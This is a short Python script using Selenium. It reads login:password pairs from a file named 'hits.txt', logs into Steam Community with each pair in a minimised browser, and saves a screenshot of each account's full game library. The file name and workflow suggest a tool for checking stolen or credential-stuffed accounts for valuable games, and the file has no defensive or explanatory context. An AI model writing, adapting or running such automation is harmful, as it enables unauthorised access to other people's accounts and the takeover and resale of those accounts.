import time

from selenium import webdriver



def Connecting_To_Browser(id_str, pass_str, i):
    if id_str != "" and pass_str != "":
        try:

            browser = webdriver.Chrome(R"C:\Users\nanda\Documents\My Games\chromedriver.exe")
            browser.minimize_window()
            browser.get('https://steamcommunity.com/login/home/?goto=')

            time.sleep(3)
            email_field = browser.find_element("xpath", '//*[@id="responsive_page_template_content"]/div[1]/div[1]/div/div/div/div[2]/div/form/div[1]/input')
            email_field.clear()

            email_field.send_keys(id_str)

            password_field = browser.find_element("xpath",'//*[@id="responsive_page_template_content"]/div[1]/div[1]/div/div/div/div[2]/div/form/div[2]/input')
            password_field.clear()
            password_field.send_keys(pass_str)

            password_next_button = browser.find_element("xpath", '//*[@id="responsive_page_template_content"]/div[1]/div[1]/div/div/div/div[2]/div/form/div[4]/button')
            password_next_button.click()
            time.sleep(3)
            get_url = browser.current_url
            uurl = str(get_url)
            profile_id_list = uurl.split('/')
            profile_id = profile_id_list[4]

            browser.get(f'https://steamcommunity.com/profiles/{profile_id}/games/?tab=all')
            browser.execute_script("document.body.style.zoom='50%'")
            time.sleep(2)
            browser.save_screenshot(f'ss/{id_str}.png')
            print("saved ss")

            browser.quit()
        except Exception as e: print(e)

    else:
        print("Either ID or PASSWORD is null")


with open('hits.txt', 'r', encoding='UTF-8') as file:
    i = 0
    while (line := file.readline().rstrip()):

        s = line
        f = s.split(':')
        id_str = f[0]
        id_pass = f[1]
        Connecting_To_Browser(id_str, id_pass, i)
        i += 1


